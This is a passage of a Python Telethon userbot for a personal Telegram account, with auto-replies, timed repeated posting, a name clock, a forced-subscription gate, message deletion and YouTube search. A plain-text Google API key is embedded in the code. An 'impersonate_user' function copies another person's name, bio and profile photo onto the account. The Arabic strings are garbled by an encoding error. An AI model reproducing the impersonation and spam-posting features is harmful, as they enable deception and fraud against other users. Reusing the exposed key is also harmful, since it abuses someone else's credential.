            }
            
            
            with open(response_file, 'wb') as f:
                pickle.dump(responses, f)
            
            if photo_path:
                await event.reply("‚éâ‚ïéÿ™ŸÖ ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ±ÿØ ŸÖÿπ ÿßŸÑÿµŸàÿ±ÿ© .. ÿ®ŸÜÿ¨ŸÄÿßÿ≠ ‚òëÔ∏è.")
            else:
                await event.reply("‚éâ‚ïéÿ™ŸÖ ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ±ÿØ ÿ®ÿØŸàŸÜ ÿµŸàÿ±ÿ© .. ÿ®ŸÜÿ¨ŸÄÿßÿ≠ ‚òëÔ∏è.")
        else:
            await event.reply("‚éô Ÿäÿ¨ÿ® ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿµŸäÿ∫ÿ© ÿßŸÑÿµÿ≠Ÿäÿ≠ÿ©: ÿ±ÿØ ÿßŸÑÿ±ÿØ")

    except Exception as e:
        await event.reply(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(e)}")


@client.on(events.NewMessage(incoming=True))
async def respond_to_message(event):
    try:
        
        if event.is_private:
            user_id = event.sender_id
            current_time = datetime.now()

            
            last_message_time_sent = user_last_message_time_sent.get(user_id, datetime.now() - timedelta(minutes=5))
            last_message_id = user_last_message_id.get(user_id)

            
            if (current_time - last_message_time_sent).total_seconds() >= 240:
                response_data = responses.get('response', {})
                keyword_response = response_data.get('response')
                photo_path = response_data.get('photo')

                if keyword_response:
                    
                    if last_message_id:
                        try:
                            await client.delete_messages(event.chat_id, last_message_id)
                        except Exception as e:
                            print(f"")

                    
                    if photo_path and os.path.exists(photo_path):
                        message = await event.respond(keyword_response, file=photo_path)
                    else:
                        message = await event.respond(keyword_response)
                    
                    
                    user_last_message_id[user_id] = message.id

                else:
                    await event.respond("")
                
                
                user_last_message_time_sent[user_id] = current_time
                with open('path_to_last_message_sent_time_file', 'wb') as f:
                    pickle.dump(user_last_message_time_sent, f)

            
            user_last_message_time[user_id] = current_time
            with open(last_message_time_file, 'wb') as f:
                pickle.dump(user_last_message_time, f)

            
            with open(last_message_id_file, 'wb') as f:
                pickle.dump(user_last_message_id, f)

    except Exception as e:
        print(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©: {str(e)}")


@client.on(events.NewMessage(from_users='me', pattern='.add'))
async def add_response(event):
    await event.delete()
    try:
        photo_path = None

        
        if event.reply_to_msg_id:
            
            replied_message = await client.get_messages(event.chat_id, ids=event.reply_to_msg_id)
            
            
            if replied_message.photo:
                
                photo_path = os.path.join(image_folder, f"{event.reply_to_msg_id}.jpg")
                await client.download_media(replied_message, file=photo_path)

        
        if ' ' in event.raw_text:
            _, args = event.raw_text.split(' ', 1)
            if '(' in args and ')' in args:
                keyword, response = args.split('(', 1)[1].split(')', 1)
                keyword = keyword.strip().lower()
                response = response.strip()

                
                responses[keyword] = {
                    'response': response,
                    'photo': photo_path
                }
                
                
                with open(response_file, 'wb') as f:
                    pickle.dump(responses, f)
                
                if photo_path:
                    await event.reply("‚éâ‚ïéÿ™ŸÖ ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ±ÿØ ŸÖÿπ ÿßŸÑÿµŸàÿ±ÿ© .. ÿ®ŸÜÿ¨ŸÄÿßÿ≠ ‚òëÔ∏è.")
                else:
                    await event.reply("‚éâ‚ïéÿ™ŸÖ ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ±ÿØ ÿ®ÿØŸàŸÜ ÿµŸàÿ±ÿ© .. ÿ®ŸÜÿ¨ŸÄÿßÿ≠ ‚òëÔ∏è.")
            else:
                await event.reply("‚éô Ÿäÿ¨ÿ® ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿµŸäÿ∫ÿ© ÿßŸÑÿµÿ≠Ÿäÿ≠ÿ©: .add (ÿßŸÑŸÉŸÑŸÖÿ© ÿßŸÑŸÖŸÅÿ™ÿßÿ≠Ÿäÿ©) ÿßŸÑÿ±ÿØ.")
        else:
            await event.reply("‚éô Ÿäÿ¨ÿ® ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿµŸäÿ∫ÿ© ÿßŸÑÿµÿ≠Ÿäÿ≠ÿ©: .add (ÿßŸÑŸÉŸÑŸÖÿ© ÿßŸÑŸÖŸÅÿ™ÿßÿ≠Ÿäÿ©) ÿßŸÑÿ±ÿØ.")

    except Exception as e:
        await event.reply(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(e)}")


@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸÑÿ±ÿØŸàÿØ'))
async def show_responses(event):
    await event.delete()
    try:
        if responses:
            message = "‚éô ÿßŸÑÿ±ÿØŸàÿØ ÿßŸÑŸÖÿ∂ÿßŸÅÿ©:\n"
            for keyword, data in responses.items():
                photo_status = "ŸÖÿ∂ÿßŸÅÿ© ÿ•ŸÑŸäŸá ÿµŸàÿ±ÿ©" if data['photo'] else "ÿ∫Ÿäÿ± ŸÖÿ∂ÿßŸÅÿ© ÿ•ŸÑŸäŸá ÿµŸàÿ±ÿ©"
                message += f"üîπ ÿßŸÑŸÉŸÑŸÖÿ© ÿßŸÑŸÖŸÅÿ™ÿßÿ≠Ÿäÿ©: {keyword}\nüî∏ ÿßŸÑÿ±ÿØ: {data['response']} ({photo_status})\n"
            await event.reply(message)
        else:
            await event.reply("‚éô ŸÑÿß ÿ™Ÿàÿ¨ÿØ ÿ±ÿØŸàÿØ ŸÖÿ∂ÿßŸÅÿ© ÿ≠ÿ™Ÿâ ÿßŸÑÿ¢ŸÜ.")
    except Exception as e:
        await event.reply(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(e)}")


@client.on(events.NewMessage(incoming=True))
async def respond_to_greeting(event):
    if event.is_private and not (await event.get_sender()).bot:
        message_text = event.raw_text.lower()
        for keyword, data in responses.items():
            if keyword in message_text:
                try:
                    if data['photo']:
                        await client.send_file(event.chat_id, file=data['photo'], caption=data['response'])
                    else:
                        await event.reply(data['response'])
                except Exception as e:
                    await event.reply(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(e)}")
                break

async def respond_to_mention(event):
    if event.is_private and not (await event.get_sender()).bot:  
        sender = await event.get_sender()
        await event.reply(f"ÿßŸÜÿ™ÿ∏ÿ± Ÿäÿ¨Ÿä ÿßŸÑŸÖÿ∑Ÿàÿ± @{sender.username} ŸàŸäÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ™ŸÉ ŸÑÿß ÿ™ÿ®ŸÇŸá ÿ™ŸÖŸÜÿ¥ŸÜŸá ŸáŸàÿßŸä")
client.add_event_handler(respond_to_mention, events.NewMessage(incoming=True, pattern=f'(?i)@{client.get_me().username}'))

def superscript_time(time_str):
    superscript_digits = str.maketrans('0123456789', 'ùü¨ùü≠ùüÆùüØùü∞ùü±ùü≤ùü≠ùü¥ùüµ')
    return time_str.translate(superscript_digits)

async def get_account_name():
    me = await client.get_me()
    return re.sub(r' - \d{2}:\d{2}', '', me.first_name)

async def update_username():
    global account_name
    iraq_tz = pytz.timezone('Asia/Baghdad')

    
    if account_name is None:
        account_name = await get_account_name()

    while True:
        now = datetime.now(iraq_tz)
        current_time = superscript_time(now.strftime("%I:%M"))

        
        current_name = await get_account_name()
        if current_name != account_name:
            account_name = current_name  

        
        if time_update_status.get('enabled', False):
            new_username = f"{account_name} - {current_time}"
        else:
            new_username = f"{account_name}"

        try:
            
            await client(UpdateProfileRequest(first_name=new_username))
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds)
        except Exception as e:
            print(f"Error updating username: {e}")
        
        
        seconds_until_next_minute = 60 - now.second
        await asyncio.sleep(seconds_until_next_minute)


base_images_dir = os.path.join(os.getcwd(), 'images')

@client.on(events.NewMessage(from_users='me', pattern=r'.ÿ™ŸÉÿ±ÿßÿ± (\d+) (\d+) ?([\s\S]*)'))
@client.on(events.NewMessage(from_users='me', pattern=r'.ÿ™ŸÉ (\d+) (\d+) ?([\s\S]*)'))
@client.on(events.NewMessage(from_users='me', pattern=r'.ŸÜÿ¥ÿ± (\d+) (\d+) ?([\s\S]*)'))
async def start_repeating_process(event):
    await event.delete()
    try:
        seconds = int(event.pattern_match.group(1))
        repeat_count = int(event.pattern_match.group(2))
        custom_text = event.pattern_match.group(3)
        
        
        if seconds < 40:
            await event.reply("‚éô Ÿäÿ¨ÿ® ÿ£ŸÜ ŸäŸÉŸàŸÜ ÿßŸÑŸàŸÇÿ™ ÿßŸÑŸÖÿ≠ÿØÿØ ŸÑÿß ŸäŸÇŸÑ ÿπŸÜ 40 ÿ´ÿßŸÜŸäÿ©.")
            return

        process_images_dir = None
        media_files = []

        if event.is_reply:
            message = await event.get_reply_message()
            
            
            process_id = int(time.time())  
            process_images_dir = os.path.join(base_images_dir, str(process_id))
            os.makedirs(process_images_dir)

            
            if message.media:
                if message.grouped_id:  
                    messages = await client.get_messages(event.chat_id, min_id=message.id - 10, max_id=message.id + 10)
                    for msg in messages:
                        if msg.grouped_id == message.grouped_id and msg.photo:
                            file_path = os.path.join(process_images_dir, f"image_{msg.id}.jpg")
                            await msg.download_media(file=file_path)
                            media_files.append(file_path)
                else:
                    if message.photo:
                        file_path = os.path.join(process_images_dir, f"image_{message.id}.jpg")
                        await message.download_media(file=file_path)
                        media_files.append(file_path)

            if not media_files and not custom_text:
                await event.reply("‚éô Ÿäÿ¨ÿ® ÿ™ÿ≠ÿØŸäÿØ ŸÜÿµ ŸÖÿÆÿµÿµ ÿ£Ÿà ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿµŸàÿ±ÿ©.")
                return

        async def task():
            for i in range(repeat_count):
                if media_files:
                    await client.send_file(event.chat_id, media_files, caption=custom_text)
                else:
                    await client.send_message(event.chat_id, custom_text)
                
                await asyncio.sleep(seconds)
            
            
            if process_images_dir and os.path.exists(process_images_dir):
                shutil.rmtree(process_images_dir)
            
            active_publishing_tasks.pop(event.chat_id, None)

        task = asyncio.create_task(task())
        
        
        if event.chat_id not in active_publishing_tasks:
            active_publishing_tasks[event.chat_id] = []
        active_publishing_tasks[event.chat_id].append((task, process_images_dir))
        
        
        await asyncio.sleep(2)
        confirmation_message = await event.reply(f"ÿ≥Ÿäÿ™ŸÖ ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ŸÉŸÑ {seconds} ÿ´ÿßŸÜŸäÿ© ŸÑŸÄ {repeat_count} ŸÖÿ±ÿßÿ™.")

        
        await asyncio.sleep(1)
        await event.delete()
        await confirmation_message.delete()

    except Exception as e:
        await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {e}")

@client.on(events.NewMessage(from_users='me', pattern=r'.ÿßŸäŸÇÿßŸÅ ÿßŸÑŸÜÿ¥ÿ± ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä'))
async def stop_sending(event):
    await event.delete()
    try:
        if event.chat_id in active_publishing_tasks:
            for task, process_images_dir in active_publishing_tasks[event.chat_id]:
                task.cancel()
                
                if process_images_dir and os.path.exists(process_images_dir):
                    shutil.rmtree(process_images_dir)
            
            del active_publishing_tasks[event.chat_id]

            
            confirmation_message = await event.reply("   ‚Äå‚Äé‚úì ÿ™ŸÖ ÿ•ŸäŸÇÿßŸÅ ÿ¨ŸÖŸäÿπ ÿπŸÖŸÑŸäÿßÿ™ ÿßŸÑŸÜÿ¥ÿ± ÿßŸÑŸÖŸÅÿπŸÑŸá   ‚Äå‚Äé‚éô.")
            
            
            await asyncio.sleep(1)
            await event.delete()
            
            
            await asyncio.sleep(3)
            await confirmation_message.delete()

        else:
            await event.reply("   ‚Äå‚Äé‚éô ŸÑÿß ÿ™Ÿàÿ¨ÿØ ÿπŸÖŸÑŸäÿßÿ™ ŸÜÿ¥ÿ± ŸÅÿπŸëÿßŸÑÿ© ŸÑÿ•ŸäŸÇÿßŸÅŸáÿß.")
    except Exception as e:
        await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {e}")


YOUTUBE_API_KEY = 'AIzaSyBfb8a-Ug_YQFrpWKeTc88zuI6PmHVdzV0'
YOUTUBE_API_URL = 'https://www.googleapis.com/youtube/v3/search'

@client.on(events.NewMessage(from_users='me', pattern=r'.ŸäŸàÿ™ŸäŸàÿ® (.+)'))
async def youtube_search(event):
    await event.delete()
    query = event.pattern_match.group(1)
    
    async with aiohttp.ClientSession() as session:
        async with session.get(YOUTUBE_API_URL, params={
            'part': 'snippet',
            'q': query,
            'key': YOUTUBE_API_KEY,
            'type': 'video',
            'maxResults': 1
        }) as response:
            data = await response.json()
            if data['items']:
                video_id = data['items'][0]['id']['videoId']
                video_url = f"https://www.youtube.com/watch?v={video_id}"
                await event.reply(f"üìπ ŸáŸÜÿß ÿ±ÿßÿ®ÿ∑ ÿßŸÑŸÅŸäÿØŸäŸà ÿßŸÑÿ∞Ÿä ÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸäŸá:\n{video_url}")
            else:
                await event.reply("‚éô ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ŸÅŸäÿØŸäŸà Ÿäÿ™ÿ∑ÿßÿ®ŸÇ ŸÖÿπ ÿßŸÑÿπŸÜŸàÿßŸÜ ÿßŸÑŸÖÿ∑ŸÑŸàÿ®.")

@client.on(events.NewMessage(from_users='me', pattern='.ÿ™ŸÅÿπŸäŸÑ ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑŸàŸÇÿ™Ÿä'))
async def enable_time_update(event):
    await event.delete()
    global time_update_status
    time_update_status['enabled'] = True
    with open(time_update_status_file, 'wb') as f:
        pickle.dump(time_update_status, f)
    reply = await event.reply("‚úì ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿßŸÑÿßÿ≥ŸÖ ŸÖÿπ ÿßŸÑŸàŸÇÿ™   ‚Äå‚Äé‚éô.")
    await event.delete()  

    await asyncio.sleep(1)
    await reply.delete()  

@client.on(events.NewMessage(from_users='me', pattern='.ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑŸàŸÇÿ™Ÿä'))
async def disable_time_update(event):
    await event.delete()
    global time_update_status
    time_update_status['enabled'] = False
    with open(time_update_status_file, 'wb') as f:
        pickle.dump(time_update_status, f)
    
    
    if account_name:
        iraq_tz = pytz.timezone('Asia/Baghdad')
        now = datetime.now(iraq_tz)
        current_name = re.sub(r' - \d{2}:\d{2}', '', account_name)
        new_username = f"{current_name}"
        
        try:
            await client(UpdateProfileRequest(first_name=new_username))
            reply = await event.reply("‚úì ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÑÿßÿ≥ŸÖ Ÿàÿ•ÿ≤ÿßŸÑÿ© ÿßŸÑŸàŸÇÿ™ ŸÖŸÜ ÿßŸÑÿßÿ≥ŸÖ   ‚Äå‚Äé‚éô.")
        except Exception as e:
            reply = await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ•ÿ≤ÿßŸÑÿ© ÿßŸÑŸàŸÇÿ™ ŸÖŸÜ ÿßŸÑÿßÿ≥ŸÖ: {e}")
    else:
        reply = await event.reply("‚éô ŸÑŸÖ Ÿäÿ™ŸÖ ÿ™ÿπŸäŸäŸÜ ÿßÿ≥ŸÖ ÿßŸÑÿ≠ÿ≥ÿßÿ®.")
    
    await event.delete()  

    await asyncio.sleep(1)
    await reply.delete()  

@client.on(events.NewMessage(from_users='me', pattern='.ÿßÿ∂ÿßŸÅÿ© ŸÇŸÜÿßÿ© ÿßÿ¥ÿ™ÿ±ÿßŸÉ (.+)'))
async def add_channel(event):
    await event.delete()
    global channel_link
    channel_link = event.pattern_match.group(1)
    with open(channel_link_file, 'wb') as f:
        pickle.dump(channel_link, f)
    await event.reply(f"   ‚Äå‚Äé‚éô ÿ™ŸÖ ÿ™ÿπŸäŸäŸÜ ÿ±ÿßÿ®ÿ∑ ÿßŸÑŸÇŸÜÿßÿ© ÿ•ŸÑŸâ: {channel_link}")
    await event.delete()  

@client.on(events.NewMessage(from_users='me', pattern= '.ŸÖÿ≥ÿ≠ ÿßŸÑŸÇŸÜÿßÿ©' ))
async def remove_channel(event):
    await event.delete()
    global channel_link
    channel_link = ''
    with open(channel_link_file, 'wb') as f:
        pickle.dump(channel_link, f)
    reply = await event.reply("‚éô ÿ™ŸÖ ŸÖÿ≥ÿ≠ ÿ±ÿßÿ®ÿ∑ ÿßŸÑŸÇŸÜÿßÿ©.")
    await event.delete()  
    await asyncio.sleep(3)
    await reply.delete()  

async def is_subscribed(user_id):
    if not channel_link:
        return True  
    channel_username = re.sub(r'https://t.me/', '', channel_link)
    try:
        offset = 0
        limit = 100
        while True:
            participants = await client(GetParticipantsRequest(
                channel=channel_username,
                filter=ChannelParticipantsSearch(''),
                offset=offset,
                limit=limit,
                hash=0
            ))
            if not participants.users:
                break
            for user in participants.users:
                if user.id == user_id:
                    return True
            offset += len(participants.users)
        return False
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
        return await is_subscribed(user_id)
    except Exception as e:
        print(f"Error checking subscription: {e}")
        return False

@client.on(events.NewMessage(incoming=True))
async def respond_to_greeting(event):
    if event.is_private and not (await event.get_sender()).bot:  
        sender = await event.get_sender()
        if sender.phone == '42777':
            
            return
        if not await is_subscribed(event.sender_id):
            await event.reply(f"ŸÑÿß ŸäŸÖŸÉŸÜŸÉ ŸÖÿ±ÿßÿ≥ŸÑÿ™Ÿä ÿßŸÑŸâ ÿ®ÿπÿØ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ŸÅŸä ŸÇŸÜÿßÿ™Ÿä: {channel_link}")
            await client.delete_messages(event.chat_id, [event.id])
        else:
            message_text = event.raw_text.lower()

@client.on(events.NewMessage(from_users='me', pattern='.del'))
async def delete_message(event):
    await event.delete()
    
    await asyncio.sleep(2)
    await event.delete()
    
    try:
        
        command, keyword = event.raw_text.split(' ', 1)
        keyword = keyword.lower()
        
        if keyword in responses:
            del responses[keyword]
            
            with open(response_file, 'wb') as f:
                pickle.dump(responses, f)
            
            
            confirmation_message = await event.reply("‚úì ÿ™ŸÖ ÿ≠ÿ∞ŸÅ ÿßŸÑÿ±ÿØ   ‚Äå‚Äé‚éô")
            
            
            await asyncio.sleep(2)
            await confirmation_message.delete()
        else:
            warning_message = await event.reply("‚éô ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿßŸÑŸÉŸÑŸÖÿ© ÿßŸÑŸÖÿ≠ÿØÿØÿ©")
            
            
            await asyncio.sleep(2)
            await warning_message.delete()
    
    
    except ValueError:
        error_message = await event.reply("‚éô ÿßÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿµŸäÿ∫ÿ©: del ÿßŸÑŸÉŸÑŸÖÿ© ÿßŸÑŸÖŸÅÿ™ÿßÿ≠Ÿäÿ©")
        
        
        await asyncio.sleep(2)
        await error_message.delete()

@client.on(events.NewMessage(from_users='me', pattern='.ÿπÿØÿßÿØ'))
async def countdown_timer(event):
    await event.delete()
    try:
        
        command, args = event.raw_text.split(' ', 1)
        minutes = int(args.strip().strip('()'))

        
        if event.chat_id in active_timers:
            active_timers[event.chat_id].cancel()
            del active_timers[event.chat_id]
            
            if event.chat_id in countdown_messages:
                await client.delete_messages(event.chat_id, countdown_messages[event.chat_id])
                del countdown_messages[event.chat_id]

        async def timer_task():
            nonlocal minutes
            total_seconds = minutes * 60
            
            countdown_message = await event.reply("**   ‚Äå‚Äé‚éô ÿ≥Ÿäÿ®ÿØÿ£ ÿßŸÑÿπÿØ ÿßŸÑÿ™ŸÜÿßÿ≤ŸÑŸä ÿ®ÿπÿØ 3 **")

            
            countdown_messages[event.chat_id] = countdown_message.id

            
            await asyncio.sleep(1)
            await countdown_message.edit("   ‚Äå‚Äé‚éô** ÿ≥Ÿäÿ®ÿØÿ£ ÿßŸÑÿπÿØ ÿßŸÑÿ™ŸÜÿßÿ≤ŸÑŸä ÿ®ÿπÿØ 2 **")


            
            await asyncio.sleep(1)
            
            
            countdown_message = await countdown_message.edit(f"   ‚Äå‚Äé‚éô** ÿ≥Ÿäÿ®ÿØÿ£ ÿßŸÑÿπÿØ ÿßŸÑÿ™ŸÜÿßÿ≤ŸÑŸä ÿ®ÿπÿØ 1**")
            
            
            while total_seconds > 0:
                minutes, seconds = divmod(total_seconds, 60)
                new_text = f"   ‚Äå‚Äé‚éô** {minutes:02}:{seconds:02} ŸÖÿ™ÿ®ŸÇŸäÿ©**"
                await asyncio.sleep(1)
                total_seconds -= 1

                try:
                    if new_text != countdown_message.text:
                        await countdown_message.edit(new_text)
                except MessageNotModifiedError:
                    pass
            
            await countdown_message.edit("   ‚Äå‚Äé‚éô **ÿßŸÑŸàŸÇÿ™ ÿßŸÜÿ™ŸáŸâ!**")
            
            

        
        active_timers[event.chat_id] = asyncio.create_task(timer_task())
        
    except (ValueError, IndexError):
        await event.reply("‚éô ÿßÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿµŸäÿ∫ÿ© ÿßŸÑÿµÿ≠Ÿäÿ≠ÿ©: ÿπÿØÿßÿØ (ÿπÿØÿØ ÿßŸÑÿØŸÇÿßÿ¶ŸÇ)")

@client.on(events.NewMessage(from_users='me', pattern='.ÿ™ŸàŸÇŸäŸÅ'))
async def stop_timers(event):
    await event.delete()
    if event.chat_id in active_timers:
        
        active_timers[event.chat_id].cancel()
        del active_timers[event.chat_id]
        
        
        if event.chat_id in countdown_messages:
            try:
                await client.delete_messages(event.chat_id, countdown_messages[event.chat_id])
                del countdown_messages[event.chat_id]
            except Exception as e:
                print(f"Error deleting countdown message: {e}")

        
        stop_message = await event.reply("‚éô ÿ™ŸÖ ÿ•ŸäŸÇÿßŸÅ ÿ¨ŸÖŸäÿπ ÿßŸÑÿπÿØÿßÿØÿßÿ™ ÿßŸÑÿ™ŸÜÿßÿ≤ŸÑŸäÿ©.")
        
        
        await asyncio.sleep(3)
        await stop_message.delete()
    else:
        
        no_timer_message = await event.reply("   ‚Äå‚Äé‚éô ŸÑÿß ÿ™Ÿàÿ¨ÿØ ÿπÿØÿßÿØÿßÿ™ ÿ™ŸÜÿßÿ≤ŸÑŸäÿ© ŸÜÿ¥ÿ∑ÿ© ŸÑÿ•ŸäŸÇÿßŸÅŸáÿß.")
        
        
        await asyncio.sleep(3)
        await no_timer_message.delete()

@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸÑÿßÿ≥ŸÖ'))
async def set_account_name(event):
    await event.delete()
    global account_name
    try:
        
        command, text = event.raw_text.split(' ', 1)
        if '(' in text and ')' in text:
            account_name = text.split('(', 1)[1].split(')')[0].strip()
        else:
            await event.reply("‚ö†Ô∏è ÿßÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿµŸäÿ∫ÿ©: .ÿßŸÑÿßÿ≥ŸÖ (ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑÿ¨ÿØŸäÿØ)")
            return
        
        
        iraq_tz = tz.gettz('Asia/Baghdad')
        now = datetime.now(iraq_tz)
        current_time = superscript_time(now.strftime("%I:%M"))
        new_username = f"{account_name} - {current_time}"
        
        try:
            await client(UpdateProfileRequest(first_name=new_username))
            await event.reply(f"‚úì ÿ™ŸÖ ÿ™ÿ∫ŸäŸäÿ± ÿßÿ≥ŸÖ ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿ•ŸÑŸâ {new_username}‚éô")
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds)
            await client(UpdateProfileRequest(first_name=new_username))
            await event.reply(f"‚éô ÿ™ŸÖ ÿ™ÿ∫ŸäŸäÿ± ÿßÿ≥ŸÖ ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿ•ŸÑŸâ {new_username}")
        except Exception as e:
            await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ™ÿ∫ŸäŸäÿ± ÿßŸÑÿßÿ≥ŸÖ: {e}")
    except ValueError:
        await event.reply("‚éô ÿßÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿµŸäÿ∫ÿ©: .ÿßŸÑÿßÿ≥ŸÖ (ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑÿ¨ÿØŸäÿØ)")

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖÿ≥ÿ≠'))
async def delete_messages(event):
    await event.delete()
    try:
        
        command, num_str = event.raw_text.split(' ', 1)
        num_messages = int(num_str.strip('()'))
        
        if num_messages <= 0:
            await event.reply("‚ö†Ô∏è Ÿäÿ¨ÿ® ÿ£ŸÜ ŸäŸÉŸàŸÜ ÿπÿØÿØ ÿßŸÑÿ±ÿ≥ÿßÿ¶ŸÑ ÿßŸÑŸÖÿ±ÿßÿØ ÿ≠ÿ∞ŸÅŸáÿß ÿ£ŸÉÿ®ÿ± ŸÖŸÜ ÿµŸÅÿ±.")
            return
        
        
        messages = await client.get_messages(event.chat_id, limit=num_messages)
        message_ids = [msg.id for msg in messages]
        
        if message_ids:
            await client(DeleteMessagesRequest(id=message_ids))
            confirmation_message = await event.reply(f"‚éô ÿ™ŸÖ ŸÖÿ≥ÿ≠ {num_messages} ÿ±ÿ≥ÿßŸÑÿ©.")
            
            
            await asyncio.sleep(2)
            await client(DeleteMessagesRequest(id=[confirmation_message.id]))
        else:
            await event.reply("‚éô ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿ±ÿ≥ÿßÿ¶ŸÑ ŸÑŸÑÿ≠ÿ∞ŸÅ.")
    except (ValueError, IndexError):
        await event.reply("‚éô ÿßÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿµŸäÿ∫ÿ©: ŸÖÿ≥ÿ≠ (ÿπÿØÿØ ÿßŸÑÿ±ÿ≥ÿßÿ¶ŸÑ)")
    except Exception as e:
        await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ≠ÿ∞ŸÅ ÿßŸÑÿ±ÿ≥ÿßÿ¶ŸÑ: {e}")


profile_saved = False


async def save_my_profile():
    
    user = await client.get_me()

    
    if not os.path.exists("imagee"):
        os.mkdir("imagee")

    
    current_name = user.first_name  
    current_bio = (await client(GetFullUserRequest(user.id))).full_user.about or ""  
    
    with open("account_info.txt", "w", encoding="utf-8") as f:
        f.write(f"Name: {current_name}\nBio: {current_bio}")
    
    
    if user.photo:
        photo_path = await client.download_profile_photo(user.id, file=f"imagee/my_profile.jpg")
        if photo_path and os.path.exists(photo_path):
            print("‚éô ÿ™ŸÖ ÿ≠ŸÅÿ∏ ÿµŸàÿ±ÿ© ÿ≠ÿ≥ÿßÿ®ŸÉ ÿ®ŸÜÿ¨ÿßÿ≠.")
        else:
            print("‚éô ÿ™ÿπÿ∞ÿ± ÿ≠ŸÅÿ∏ ÿµŸàÿ±ÿ© ÿ≠ÿ≥ÿßÿ®ŸÉ.")
    else:
        print("‚éô ŸÑÿß ŸäŸàÿ¨ÿØ ÿµŸàÿ±ÿ© ŸÑÿ≠ÿ≥ÿßÿ®ŸÉ.")

    print(f"‚éô ÿ™ŸÖ ÿ≠ŸÅÿ∏ ÿßÿ≥ŸÖŸÉ Ÿàÿ®ÿßŸäŸà ÿ≠ÿ≥ÿßÿ®ŸÉ: {current_name}, {current_bio}")


async def impersonate_user(event):
    global profile_saved

    
    if not profile_saved:
        await save_my_profile()
        profile_saved = True  

    
    if event.is_reply:
        reply_message = await event.get_reply_message()
        user = await client(GetFullUserRequest(reply_message.sender_id))

        
        new_name = user.users[0].first_name  
        new_bio = user.full_user.about if user.full_user.about else ""  
        
        try:
            await client(UpdateProfileRequest(first_name=new_name, about=new_bio))
            await event.delete()
            await event.reply(f"‚éô ÿ™ŸÖ ÿ™ÿ∫ŸäŸäÿ± ÿßŸÑÿßÿ≥ŸÖ ÿ•ŸÑŸâ {new_name} ŸàÿßŸÑÿ®ÿßŸäŸà ÿ•ŸÑŸâ: {new_bio}")
        except Exception as e:
            await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑÿßÿ≥ŸÖ ÿ£Ÿà ÿßŸÑÿ®ÿßŸäŸà: {e}")

        
        if user.users[0].photo:
            
            if not os.path.exists("hh"):
                os.mkdir("hh")

            
            photo_path = await client.download_profile_photo(user.users[0].id, file=f"hh/{user.users[0].id}.jpg")
            
            
            if photo_path and os.path.exists(photo_path):
                try:
                    
                    await client(DeletePhotosRequest(await client.get_profile_photos('me')))
                    
                    
                    uploaded_file = await client.upload_file(photo_path)

                    
                    await client(UploadProfilePhotoRequest(file=uploaded_file))
                    
                    await event.delete()
                    await event.reply("‚éô ÿ™ŸÖ ÿ™ÿ∫ŸäŸäÿ± ÿµŸàÿ±ÿ© ÿßŸÑÿ≠ÿ≥ÿßÿ®")
                except (StickerMimeInvalidError, PhotoExtInvalidError, PhotoCropSizeSmallError, ImageProcessFailedError) as e:
